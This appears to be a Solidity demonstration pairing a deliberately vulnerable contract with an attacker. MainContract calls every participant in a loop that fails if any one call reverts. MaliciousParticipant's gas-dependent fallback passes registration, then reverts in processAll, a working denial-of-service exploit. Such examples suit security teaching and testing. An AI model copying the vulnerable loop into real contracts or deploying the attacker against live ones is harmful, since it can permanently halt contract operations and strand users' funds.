// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract MainContract {
    address[] public participants;

function addParticipant(address participant) external {
    (bool success, ) = participant.call{gas: 10000}("");
    require(success, "Contract does not have a fallback function");
    participants.push(participant);
}

    function processAll() external {
        for (uint256 i = 0; i < participants.length; i++) {
            (bool success, ) = participants[i].call("");
            require(success, "Call to participant failed");
        }
    }
}

contract MaliciousParticipant {
    fallback() external {
        if (gasleft() > 10000) {
            revert("Attack!");
        }
    }
    function attack(address target) public {
        MainContract(target).addParticipant(address(this));
    }
}